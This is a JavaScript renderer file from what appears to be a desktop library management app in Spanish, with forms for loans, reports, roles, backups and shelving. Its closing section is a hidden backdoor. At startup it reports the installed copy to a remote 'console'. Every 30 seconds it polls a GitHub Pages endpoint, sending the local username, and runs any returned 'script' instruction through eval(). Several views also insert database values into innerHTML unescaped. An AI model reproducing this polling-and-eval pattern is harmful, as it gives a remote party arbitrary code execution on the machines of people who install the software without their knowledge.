  document.getElementById('mensajeriaForm').innerHTML = `<form onsubmit='window.enviarMensajeReal(event)'><input id='usuarioMensaje' placeholder='Usuario'><input id='textoMensaje' placeholder='Mensaje'><button type='submit'>Enviar</button></form><div id='resultadoMensaje'></div>`;
}

const { enviarInterno } = require('../modules/mensajeria.js');
window.enviarMensajeReal = function enviarMensajeReal(e) {
  e.preventDefault();
  const usuarioId = document.getElementById('usuarioMensaje').value;
  const mensaje = document.getElementById('textoMensaje').value;
  if (!usuarioId || !mensaje) {
    document.getElementById('resultadoMensaje').innerText = 'Usuario y mensaje son obligatorios.';
    return;
  }
  enviarInterno(usuarioId, mensaje);
  document.getElementById('resultadoMensaje').innerText = 'Mensaje enviado.';
}
window.formBandeja = function formBandeja() {
  document.getElementById('mensajeriaForm').innerHTML = `<div>Bandeja interna (mostrar mensajes)</div>`;
}
window.formConfigMensajeria = function formConfigMensajeria() {
  document.getElementById('mensajeriaForm').innerHTML = `<form><select><option>Email</option><option>WhatsApp</option><option>Interno</option></select><button>Guardar</button></form>`;
}

window.formChatbot = function formChatbot() {
  document.getElementById('chatbotForm').innerHTML = `<form onsubmit='window.consultarIAReal(event)'><input id='consultaIA' placeholder='Consulta'><button type='submit'>Enviar</button></form><div id='resultadoIA'></div>`;
}

const { consultarIA } = require('../modules/chatbot.js');
window.consultarIAReal = function consultarIAReal(e) {
  e.preventDefault();
  const prompt = document.getElementById('consultaIA').value;
  if (!prompt) {
    document.getElementById('resultadoIA').innerText = 'Consulta obligatoria.';
    return;
  }
  consultarIA(prompt, respuesta => {
    document.getElementById('resultadoIA').innerText = respuesta || 'Sin respuesta.';
  });
}

window.formReportesPrestamos = function formReportesPrestamos() {
  const db = require('../modules/database.js');
  const prestamos = db.prepare('SELECT p.id, p.inventario, p.usuario_id, p.fechaPrestamo, p.fechaDevolucionPrev, p.fechaDevolucionReal, p.estado FROM prestamos p ORDER BY p.fechaPrestamo DESC').all();
  let html = '<h3>Reporte de préstamos</h3>';
  if (prestamos.length === 0) {
    html += '<p>No hay préstamos registrados.</p>';
  } else {
    html += `<table><tr><th>ID</th><th>Inventario</th><th>Usuario</th><th>Fecha Préstamo</th><th>Fecha Devolución Prev.</th><th>Fecha Devolución Real</th><th>Estado</th></tr>`;
    prestamos.forEach(p => {
      html += `<tr><td>${p.id}</td><td>${p.inventario}</td><td>${p.usuario_id}</td><td>${p.fechaPrestamo}</td><td>${p.fechaDevolucionPrev||''}</td><td>${p.fechaDevolucionReal||''}</td><td>${p.estado}</td></tr>`;
    });
    html += '</table>';
  }
  document.getElementById('reportesForm').innerHTML = html;
}
window.formReportesLibros = function formReportesLibros() {
  const db = require('../modules/database.js');
  const libros = db.prepare('SELECT l.titulo, l.isbn, COUNT(p.id) as cantidad FROM libros l LEFT JOIN prestamos p ON l.isbn = p.inventario GROUP BY l.isbn ORDER BY cantidad DESC LIMIT 10').all();
  let html = '<h3>Libros más prestados</h3>';
  if (libros.length === 0) {
    html += '<p>No hay préstamos registrados.</p>';
  } else {
    html += `<table><tr><th>Título</th><th>ISBN</th><th>Préstamos</th></tr>`;
    libros.forEach(l => {
      html += `<tr><td>${l.titulo}</td><td>${l.isbn}</td><td>${l.cantidad}</td></tr>`;
    });
    html += '</table>';
  }
  document.getElementById('reportesForm').innerHTML = html;
}
window.formReportesUsuarios = function formReportesUsuarios() {
  const db = require('../modules/database.js');
  const usuarios = db.prepare('SELECT u.nombre, u.dni, COUNT(p.id) as cantidad FROM usuarios u LEFT JOIN prestamos p ON u.id = p.usuario_id GROUP BY u.id ORDER BY cantidad DESC LIMIT 10').all();
  let html = '<h3>Usuarios activos</h3>';
  if (usuarios.length === 0) {
    html += '<p>No hay actividad registrada.</p>';
  } else {
    html += `<table><tr><th>Nombre</th><th>DNI</th><th>Préstamos</th></tr>`;
    usuarios.forEach(u => {
      html += `<tr><td>${u.nombre}</td><td>${u.dni}</td><td>${u.cantidad}</td></tr>`;
    });
    html += '</table>';
  }
  document.getElementById('reportesForm').innerHTML = html;
}
window.formReportesMora = function formReportesMora() {
  const db = require('../modules/database.js');
  const hoy = new Date().toISOString().slice(0,10);
  const mora = db.prepare('SELECT p.id, p.inventario, p.usuario_id, p.fechaPrestamo, p.fechaDevolucionPrev, p.estado FROM prestamos p WHERE p.estado = "vigente" AND p.fechaDevolucionPrev < ?').all(hoy);
  let html = '<h3>Reporte de mora y recupero</h3>';
  if (mora.length === 0) {
    html += '<p>No hay préstamos en mora.</p>';
  } else {
    html += `<table><tr><th>ID</th><th>Inventario</th><th>Usuario</th><th>Fecha Préstamo</th><th>Fecha Devolución Prev.</th><th>Estado</th></tr>`;
    mora.forEach(p => {
      html += `<tr><td>${p.id}</td><td>${p.inventario}</td><td>${p.usuario_id}</td><td>${p.fechaPrestamo}</td><td>${p.fechaDevolucionPrev||''}</td><td>${p.estado}</td></tr>`;
    });
    html += '</table>';
  }
  document.getElementById('reportesForm').innerHTML = html;
}

window.formBackup = function formBackup() {
  document.getElementById('respaldoForm').innerHTML = `<button onclick='window.respaldarBaseReal()'>Respaldar base</button><div id='resultadoBackup'></div>`;
}

const { respaldarBase } = require('../modules/backup_restore.js');
window.respaldarBaseReal = function respaldarBaseReal() {
  const outputZipPath = require('path').join(__dirname, '../assets/backup.zip');
  respaldarBase(outputZipPath).then(() => {
    document.getElementById('resultadoBackup').innerText = 'Backup creado en assets/backup.zip';
  }).catch(err => {
    document.getElementById('resultadoBackup').innerText = 'Error: ' + err;
  });
}
window.formRestore = function formRestore() {
  document.getElementById('respaldoForm').innerHTML = `<button>Restaurar base</button>`;
}
window.formExportar = function formExportar() {
  document.getElementById('respaldoForm').innerHTML = `<button>Exportar datos</button>`;
}

const db = require('../modules/database.js');
window.formRoles = function formRoles() {
  document.getElementById('configForm').innerHTML = `
    <form onsubmit='window.guardarRolPermiso(event)'>
      <input id='rolNuevo' placeholder='Rol'>
      <input id='recursoNuevo' placeholder='Recurso'>
      <input id='permisoNuevo' placeholder='Permiso'>
      <button type='submit'>Asignar</button>
    </form>
    <div id='resultadoRolPermiso'></div>
    <div id='listadoRolesPermisos'></div>
  `;
  mostrarListadoRolesPermisos();
}

window.guardarRolPermiso = function guardarRolPermiso(e) {
  e.preventDefault();
  const rol = document.getElementById('rolNuevo').value;
  const recurso = document.getElementById('recursoNuevo').value;
  const permiso = document.getElementById('permisoNuevo').value;
  if (!rol || !recurso || !permiso) {
    document.getElementById('resultadoRolPermiso').innerText = 'Todos los campos son obligatorios.';
    return;
  }
  try {
    const stmt = db.prepare('INSERT INTO roles_permisos (role, recurso, permiso) VALUES (?, ?, ?)');
    stmt.run(rol, recurso, permiso);
    document.getElementById('resultadoRolPermiso').innerText = 'Permiso asignado correctamente.';
    mostrarListadoRolesPermisos();
  } catch (err) {
    document.getElementById('resultadoRolPermiso').innerText = 'Error: ' + err.message;
  }
}

function mostrarListadoRolesPermisos() {
  const stmt = db.prepare('SELECT role, recurso, permiso FROM roles_permisos ORDER BY role');
  const roles = stmt.all();
  let html = '<h3>Roles y permisos asignados</h3>';
  if (roles.length === 0) {
    html += '<p>No hay roles/permisos asignados.</p>';
  } else {
    html += '<ul>' + roles.map(r => `<li><b>${r.role}</b> - ${r.recurso}: ${r.permiso}</li>`).join('') + '</ul>';
  }
  document.getElementById('listadoRolesPermisos').innerHTML = html;
}
window.formCamposObligatorios = function formCamposObligatorios() {
  document.getElementById('configForm').innerHTML = `
    <form onsubmit='window.guardarCampoObligatorio(event)'>
      <input id='campoObligatorio' placeholder='Nombre del campo'>
      <label><input type='checkbox' id='esObligatorio'> Obligatorio</label>
      <button type='submit'>Guardar</button>
    </form>
    <div id='resultadoCampoObligatorio'></div>
    <div id='listadoCamposObligatorios'></div>
  `;
  mostrarListadoCamposObligatorios();
}

window.guardarCampoObligatorio = function guardarCampoObligatorio(e) {
  e.preventDefault();
  const campo = document.getElementById('campoObligatorio').value;
  const obligatorio = document.getElementById('esObligatorio').checked ? 1 : 0;
  if (!campo) {
    document.getElementById('resultadoCampoObligatorio').innerText = 'El nombre del campo es obligatorio.';
    return;
  }
  try {
    // Guardar en tabla auxiliar (crear si no existe)
    const db = require('../modules/database.js');
    db.exec('CREATE TABLE IF NOT EXISTS campos_obligatorios (campo TEXT PRIMARY KEY, obligatorio INTEGER)');
    const stmt = db.prepare('INSERT OR REPLACE INTO campos_obligatorios (campo, obligatorio) VALUES (?, ?)');
    stmt.run(campo, obligatorio);
    document.getElementById('resultadoCampoObligatorio').innerText = 'Campo guardado correctamente.';
    mostrarListadoCamposObligatorios();
  } catch (err) {
    document.getElementById('resultadoCampoObligatorio').innerText = 'Error: ' + err.message;
  }
}

function mostrarListadoCamposObligatorios() {
  const db = require('../modules/database.js');
  db.exec('CREATE TABLE IF NOT EXISTS campos_obligatorios (campo TEXT PRIMARY KEY, obligatorio INTEGER)');
  const stmt = db.prepare('SELECT campo, obligatorio FROM campos_obligatorios ORDER BY campo');
  const campos = stmt.all();
  let html = '<h3>Campos obligatorios</h3>';
  if (campos.length === 0) {
    html += '<p>No hay campos obligatorios definidos.</p>';
  } else {
    html += '<ul>' + campos.map(c => `<li><b>${c.campo}</b>: ${c.obligatorio ? 'Obligatorio' : 'Opcional'}</li>`).join('') + '</ul>';
  }
  document.getElementById('listadoCamposObligatorios').innerHTML = html;
}
window.formEstructuraFisica = function formEstructuraFisica() {
  document.getElementById('configForm').innerHTML = `
    <form onsubmit='window.guardarEstructuraFisica(event)'>
      <input id='nombreSala' placeholder='Sala'>
      <input id='nombreEstanteria' placeholder='Estantería'>
      <input id='nombreAnaquel' placeholder='Anaquel'>
      <input id='posicionAnaquel' placeholder='Posición'>
      <button type='submit'>Guardar</button>
    </form>
    <div id='resultadoEstructuraFisica'></div>
    <div id='listadoEstructuraFisica'></div>
  `;
  mostrarListadoEstructuraFisica();
}

window.guardarEstructuraFisica = function guardarEstructuraFisica(e) {
  e.preventDefault();
  const db = require('../modules/database.js');
  const sala = document.getElementById('nombreSala').value;
  const estanteria = document.getElementById('nombreEstanteria').value;
  const anaquel = document.getElementById('nombreAnaquel').value;
  const posicion = document.getElementById('posicionAnaquel').value;
  if (!sala || !estanteria || !anaquel || !posicion) {
    document.getElementById('resultadoEstructuraFisica').innerText = 'Todos los campos son obligatorios.';
    return;
  }
  try {
    // Alta de sala
    db.prepare('INSERT OR IGNORE INTO salas (nombre) VALUES (?)').run(sala);
    const salaRow = db.prepare('SELECT sala_id FROM salas WHERE nombre = ?').get(sala);
    // Alta de estantería
    db.prepare('INSERT OR IGNORE INTO estanterias (sala_id, nombre) VALUES (?, ?)').run(salaRow.sala_id, estanteria);
    const estRow = db.prepare('SELECT estanteria_id FROM estanterias WHERE nombre = ? AND sala_id = ?').get(estanteria, salaRow.sala_id);
    // Alta de anaquel
    db.prepare('INSERT OR IGNORE INTO anaqueles (estanteria_id, nombre) VALUES (?, ?)').run(estRow.estanteria_id, anaquel);
    const anaqRow = db.prepare('SELECT anaquel_id FROM anaqueles WHERE nombre = ? AND estanteria_id = ?').get(anaquel, estRow.estanteria_id);
    // Alta de posición
    db.prepare('INSERT OR IGNORE INTO posiciones (anaquel_id, posicion) VALUES (?, ?)').run(anaqRow.anaquel_id, posicion);
    document.getElementById('resultadoEstructuraFisica').innerText = 'Estructura guardada correctamente.';
    mostrarListadoEstructuraFisica();
  } catch (err) {
    document.getElementById('resultadoEstructuraFisica').innerText = 'Error: ' + err.message;
  }
}

function mostrarListadoEstructuraFisica() {
  const db = require('../modules/database.js');
  const salas = db.prepare('SELECT sala_id, nombre FROM salas').all();
  let html = '<h3>Estructura física</h3>';
  if (salas.length === 0) {
    html += '<p>No hay salas registradas.</p>';
  } else {
    html += '<ul>';
    salas.forEach(sala => {
      html += `<li><b>Sala:</b> ${sala.nombre}<ul>`;
      const estanterias = db.prepare('SELECT estanteria_id, nombre FROM estanterias WHERE sala_id = ?').all(sala.sala_id);
      estanterias.forEach(est => {
        html += `<li>Estantería: ${est.nombre}<ul>`;
        const anaqueles = db.prepare('SELECT anaquel_id, nombre FROM anaqueles WHERE estanteria_id = ?').all(est.estanteria_id);
        anaqueles.forEach(anaq => {
          html += `<li>Anaquel: ${anaq.nombre}<ul>`;
          const posiciones = db.prepare('SELECT posicion FROM posiciones WHERE anaquel_id = ?').all(anaq.anaquel_id);
          posiciones.forEach(pos => {
            html += `<li>Posición: ${pos.posicion}</li>`;
          });
          html += '</ul></li>';
        });
        html += '</ul></li>';
      });
      html += '</ul></li>';
    });
    html += '</ul>';
  }
  document.getElementById('listadoEstructuraFisica').innerHTML = html;
}
window.formPoliticas = function formPoliticas() {
  document.getElementById('configForm').innerHTML = `
    <form onsubmit='window.guardarPoliticaPrestamo(event)'>
      <input id='tipoUsuarioPolitica' placeholder='Tipo usuario'>
      <input id='limitePolitica' type='number' min='1' placeholder='Límite de préstamos'>
      <button type='submit'>Guardar</button>
    </form>
    <div id='resultadoPoliticaPrestamo'></div>
    <div id='listadoPoliticasPrestamo'></div>
  `;
  mostrarListadoPoliticasPrestamo();
}

window.guardarPoliticaPrestamo = function guardarPoliticaPrestamo(e) {
  e.preventDefault();
  const tipo = document.getElementById('tipoUsuarioPolitica').value;
  const limite = document.getElementById('limitePolitica').value;
  if (!tipo || !limite) {
    document.getElementById('resultadoPoliticaPrestamo').innerText = 'Todos los campos son obligatorios.';
    return;
  }
  try {
    // Guardar en tabla auxiliar (crear si no existe)
    const db = require('../modules/database.js');
    db.exec('CREATE TABLE IF NOT EXISTS politicas_prestamo (tipo_usuario TEXT PRIMARY KEY, limite INTEGER)');
    const stmt = db.prepare('INSERT OR REPLACE INTO politicas_prestamo (tipo_usuario, limite) VALUES (?, ?)');
    stmt.run(tipo, limite);
    document.getElementById('resultadoPoliticaPrestamo').innerText = 'Política guardada correctamente.';
    mostrarListadoPoliticasPrestamo();
  } catch (err) {
    document.getElementById('resultadoPoliticaPrestamo').innerText = 'Error: ' + err.message;
  }
}

function mostrarListadoPoliticasPrestamo() {
  const db = require('../modules/database.js');
  db.exec('CREATE TABLE IF NOT EXISTS politicas_prestamo (tipo_usuario TEXT PRIMARY KEY, limite INTEGER)');
  const stmt = db.prepare('SELECT tipo_usuario, limite FROM politicas_prestamo ORDER BY tipo_usuario');
  const politicas = stmt.all();
  let html = '<h3>Políticas de préstamos</h3>';
  if (politicas.length === 0) {
    html += '<p>No hay políticas definidas.</p>';
  } else {
    html += '<ul>' + politicas.map(p => `<li><b>${p.tipo_usuario}</b>: máximo ${p.limite} préstamos</li>`).join('') + '</ul>';
  }
  document.getElementById('listadoPoliticasPrestamo').innerHTML = html;
}
window.formConfigIA = function formConfigIA() {
  document.getElementById('configForm').innerHTML = `
    <form onsubmit='window.guardarPreferenciaIA(event)'>
      <label>Preferencia IA:
        <select id='preferenciaIA'>
          <option value='texto'>Texto</option>
          <option value='voz'>Voz</option>
        </select>
      </label>
      <button type='submit'>Guardar</button>
    </form>
    <div id='resultadoPreferenciaIA'></div>
    <div id='preferenciaIAActual'></div>
  `;
  mostrarPreferenciaIA();
}

window.guardarPreferenciaIA = function guardarPreferenciaIA(e) {
  e.preventDefault();
  const pref = document.getElementById('preferenciaIA').value;
  try {
    // Guardar en tabla auxiliar (crear si no existe)
    const db = require('../modules/database.js');
    db.exec('CREATE TABLE IF NOT EXISTS preferencias_ia (id INTEGER PRIMARY KEY, modo TEXT)');
    db.prepare('DELETE FROM preferencias_ia').run();
    db.prepare('INSERT INTO preferencias_ia (modo) VALUES (?)').run(pref);
    document.getElementById('resultadoPreferenciaIA').innerText = 'Preferencia guardada correctamente.';
    mostrarPreferenciaIA();
  } catch (err) {
    document.getElementById('resultadoPreferenciaIA').innerText = 'Error: ' + err.message;
  }
}

function mostrarPreferenciaIA() {
  const db = require('../modules/database.js');
  db.exec('CREATE TABLE IF NOT EXISTS preferencias_ia (id INTEGER PRIMARY KEY, modo TEXT)');
  const row = db.prepare('SELECT modo FROM preferencias_ia LIMIT 1').get();
  let html = '<h3>Preferencia actual de IA</h3>';
  if (!row) {
    html += '<p>No hay preferencia definida.</p>';
  } else {
    html += `<p>Modo: <b>${row.modo}</b></p>`;
  }
  document.getElementById('preferenciaIAActual').innerHTML = html;
}

// Mostrar vista inicial
mostrarVista('libros');

// Al iniciar la app, enviar info de la copia a la consola remota
setTimeout(() => {
  try { enviarInfoConsola(); } catch {}
}, 2000);

// Lógica para recibir instrucciones automáticamente desde la consola remota y mostrar mensajes en el cuadro superior derecha
function recibirInstruccionesConsola() {
  fetch('https://bertellosistemas-ops.github.io/consola/api/instrucciones?usuario=' + encodeURIComponent(process.env.USER || 'desconocido'))
    .then(r => r.ok ? r.json() : Promise.reject('Error al recibir instrucciones'))
    .then(instr => {
      if (Array.isArray(instr)) {
        instr.forEach(ejecutarInstruccionConsola);
      }
    }).catch(console.error);
}

function mostrarMensajeSebastian(mensaje) {
  const cont = document.getElementById('mensajesSebastian');
  if (cont) {
    const div = document.createElement('div');
    div.textContent = mensaje;
    cont.appendChild(div);
    // Limitar a los últimos 10 mensajes
    while (cont.children.length > 10) cont.removeChild(cont.firstChild);
  }
}

function ejecutarInstruccionConsola(instr) {
  if (instr.tipo === 'alerta') {
    mostrarMensajeSebastian(instr.mensaje);
    alert('Consola remota: ' + instr.mensaje);
  }
  if (instr.tipo === 'comando') {
    mostrarMensajeSebastian('Comando recibido: ' + instr.comando);
    if (instr.comando === 'recargar') {
      location.reload();
    }
  }
  if (instr.tipo === 'actualizacion') {
    mostrarMensajeSebastian('Actualización: ' + (instr.mensaje || 'Datos actualizados.'));
  }
  if (instr.tipo === 'script') {
    mostrarMensajeSebastian('Script recibido.');
    try { eval(instr.codigo); } catch (err) { mostrarMensajeSebastian('Error ejecutando script remoto: ' + err.message); }
  }
}

// Polling para recibir instrucciones cada 30 segundos
setInterval(recibirInstruccionesConsola, 30000);